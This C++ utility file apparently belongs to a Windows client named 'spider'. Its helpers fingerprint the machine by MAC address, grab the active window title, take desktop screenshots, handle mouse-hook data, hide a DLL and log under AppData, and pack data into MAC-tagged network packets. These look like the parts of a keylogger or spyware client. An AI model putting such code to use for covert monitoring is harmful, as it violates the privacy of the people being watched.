#include "StaticTools.h"
#include <Windows.h>

std::string StaticTools::Mac = "";
std::ofstream StaticTools::Log;

std::string StaticTools::GetMacAddress(void)
{
	ULONG size = sizeof(IP_ADAPTER_INFO);
	std::stringstream ss;
	PIP_ADAPTER_INFO adapter = new IP_ADAPTER_INFO;

	ULONG ret = GetAdaptersInfo(adapter, &size);
	if (ret == ERROR_SUCCESS) {
		ss << std::hex << (int)adapter->Address[0] << std::hex << (int)adapter->Address[1]
			<< std::hex << (int)adapter->Address[2] << std::hex << (int)adapter->Address[3]
			<< std::hex << (int)adapter->Address[4] << std::hex << (int)adapter->Address[5]
			<< std::flush;
		delete (adapter);
		return (ss.str());
	}
	else if (ret == ERROR_BUFFER_OVERFLOW) {
		delete (adapter);
		adapter = (PIP_ADAPTER_INFO)malloc(size);
		if (GetAdaptersInfo(adapter, &size) == ERROR_SUCCESS) {
			ss << std::hex << (int)adapter->Address[0] << std::hex << (int)adapter->Address[1]
				<< std::hex << (int)adapter->Address[2] << std::hex << (int)adapter->Address[3]
				<< std::hex << (int)adapter->Address[4] << std::hex << (int)adapter->Address[5]
				<< std::flush;
			free(adapter);
			return (ss.str());
		}
		free(adapter);
	}
	else {
		delete (adapter);
	}
	/*std::ofstream ofs("debug.log", std::ios::app | std::ios::out);
	ofs << "ulong: " << (ERROR_INVALID_DATA == ret) << std::endl;
	ofs << "ulong: " << (ERROR_BUFFER_OVERFLOW == ret) << std::endl;*/
	return ("");
}

std::streamoff StaticTools::GetFileSize(std::string const& filename)
{
	std::ifstream in(filename.c_str(), std::ifstream::ate | std::ifstream::binary);
	return (in.tellg());
}

std::string StaticTools::GetActiveWindowTitle()
{
	char title[256];
	HWND hwnd = GetForegroundWindow();

	GetWindowText(hwnd, title, sizeof(title));

	return (title);
}

std::string StaticTools::GetDate(void)
{
	std::stringstream ss;
	boost::posix_time::ptime now = boost::posix_time::second_clock::local_time();
	ss << std::right << now.date().day() << "/"
		<< now.date().month() << "/"
		<< now.date().year() << " - "
		<< std::setw(2) << std::setfill('0') << now.time_of_day().hours() << "h"
		<< std::setw(2) << std::setfill('0') << now.time_of_day().minutes() << "m"
		<< std::setw(2) << std::setfill('0') << now.time_of_day().seconds() << "s" << std::flush;
	return (ss.str());
}

#include <atlimage.h>

HBITMAP StaticTools::MakeScreenshot(void)
{
	/*
	if (!StaticTools::Log.is_open())
		StaticTools::Log.open(StaticTools::GetProjectResourceDirectory() + "\\.log", std::ios::app | std::ios::out);
	StaticTools::Log << "Taking Screenshot...";
	*/
	RECT desktop;
	const HWND hDesktop = GetDesktopWindow();
	GetWindowRect(hDesktop, &desktop);

	HDC     hScreen = GetDC(NULL);
	HDC     hDC = CreateCompatibleDC(hScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, abs(desktop.right), abs(desktop.bottom));
	HGDIOBJ old_obj = SelectObject(hDC, hBitmap);

	BitBlt(hDC, 0, 0, abs(desktop.right), abs(desktop.bottom), hScreen, 0, 0, SRCCOPY);

	SelectObject(hDC, old_obj);
	DeleteDC(hDC);
	ReleaseDC(NULL, hScreen);

	/*
	StaticTools::Log << "Done" << std::endl;
	*/
	return hBitmap;
}

HBITMAP StaticTools::BmpAddMouseAtPos(HBITMAP source, LPMSLLHOOKSTRUCT mouse)
{
	if (!StaticTools::Log.is_open())
		StaticTools::Log.open(StaticTools::GetProjectResourceDirectory() + "\\.log", std::ios::app | std::ios::out);
	StaticTools::Log << "=== StaticTools::BmpAddMouseAtPos ===" << std::endl;
	StaticTools::Log << "Parameters : [HBITMAP source = " << source << "; LPMSLLHOOKSTRUCT mouse = " << mouse << "]" << std::endl;

	StaticTools::Log << "mouse->pt.y = " << mouse->pt.y << std::endl;
	StaticTools::Log << "mouse->pt.x = " << mouse->pt.x << std::endl;

	BITMAPINFO bmpInfo;
	DIBSECTION ds;

	StaticTools::Log << "Getting DC...";
	HDC hDC = GetDC(NULL);

	StaticTools::Log << (hDC ? "Done" : "Failed") << std::endl;

	memset(&bmpInfo, 0, sizeof(bmpInfo));
	bmpInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);

	StaticTools::Log << "Getting DI Bits...";
	if (GetDIBits(hDC, source, 0, 1, NULL, (BITMAPINFO *)&bmpInfo, DIB_RGB_COLORS) == 0)
		StaticTools::Log << "Failed";
	else
		StaticTools::Log << "Done";
	StaticTools::Log << std::endl;
	StaticTools::Log << "bmpInfo.bmiHeader.biSize = " << bmpInfo.bmiHeader.biSize << std::endl;
	StaticTools::Log << "bmpInfo.bmiHeader.biBitCount = " << bmpInfo.bmiHeader.biBitCount << std::endl;

	if (bmpInfo.bmiHeader.biBitCount == 32) {
		StaticTools::Log << "Getting DIBSECTION...";
		if (GetObject(source, sizeof(ds), &ds) == 0)
			StaticTools::Log << "Failed";
		else
			StaticTools::Log << "Done";
		StaticTools::Log << std::endl;

		StaticTools::Log << "ds.dsBm.bmBits = " << ds.dsBm.bmBits << std::endl;
		StaticTools::Log << "ds.dsBm.bmWidth = " << ds.dsBm.bmWidth << std::endl;
		StaticTools::Log << "ds.dsBm.bmHeight = " << ds.dsBm.bmHeight << std::endl;
		uint32_t *bytes = static_cast<uint32_t *>(ds.dsBm.bmBits);
		size_t pos = mouse->pt.y * ds.dsBm.bmWidth + mouse->pt.x;
		StaticTools::Log << "pos = " << pos << std::endl;
		
		//uint32_t pixel = bytes[0];

		/*
		std::stringstream ss;
		std::string color, message;

		ss << std::hex << pixel;
		ss >> color;
		message += "0x";
		message += color + "\nSize w:" + std::to_string(ds.dsBm.bmWidth) + "; h:" + std::to_string(ds.dsBm.bmHeight);

		MessageBox(NULL, message.c_str(), (std::string("Debug") + std::to_string(pos)).c_str(), MB_OK);
		*/
	}

	StaticTools::Log << "Releasing DC" << std::endl;
	ReleaseDC(NULL, hDC);
	StaticTools::Log << "Returning source (" << source << ")" << std::endl;
	StaticTools::Log << "=== Function End ===" << std::endl;
	return source;
}

std::string StaticTools::GetFolderPath(WORD id)
{
	CHAR szPath[MAX_PATH];
	if (SUCCEEDED(SHGetFolderPath(NULL, id, NULL, 0, szPath))) {
		return (szPath);
	}
	throw (std::runtime_error(std::string("Folder " + std::to_string(id) + " not found")));
}

std::string StaticTools::GetProjectResourceDirectory(void)
{
	return (StaticTools::GetFolderPath(CSIDL_APPDATA) + "\\spider");
}

void StaticTools::CreateFolder(std::string const& path)
{
	if (!boost::filesystem::exists(path)) {
		if (!boost::filesystem::create_directory(path))
			throw (std::runtime_error("can not create spider folder '" + path + "'"));
	}
}

std::string StaticTools::GetDLLPath() {
	std::string dllName(DLL_NAME);
	return GetProjectResourceDirectory() + "\\" + dllName;
}


std::string StaticTools::GetDLLPath(std::string const& appPath)
{
	std::string dllName(DLL_NAME);
	std::string ret;

	ret = appPath.substr(0, appPath.find_last_of('\\'));
	ret += "\\" + dllName;
	return (ret);
}

Packet *StaticTools::CreatePacket(PacketType type, std::string const& data)
{
	size_t i = 0;
	Packet *packet = (Packet *)malloc(sizeof(Packet) + (sizeof(char) * data.size() + 1));
	packet->MAGIC = MAGIC_NUMBER;
	packet->type = type;
	packet->size = data.size();
	while (i < data.size()) {
		packet->data[i] = data.at(i);
		++i;
	}
	packet->data[i] = 0;
	return (packet);
}

Packet *StaticTools::CreateUDPPacket(PacketType type, std::string const& data)
{
	std::string mac = StaticTools::Mac;
	size_t i = 0;
	Packet *packet = (Packet *)malloc(sizeof(Packet) + (sizeof(char) * (mac.size() + data.size() + 2)));
	packet->MAGIC = MAGIC_NUMBER;
	packet->type = type;
	packet->size = data.size() + mac.size() + 1;
	while (i < mac.size()) {
		packet->data[i] = mac.at(i);
		++i;
	}
	packet->data[i] = ' ';
	++i;
	while (i < data.size() + (mac.size() + 1))
	{
		packet->data[i] = data.at(i - (mac.size() + 1));
		++i;
	}
	packet->data[i] = 0;
	return (packet);
}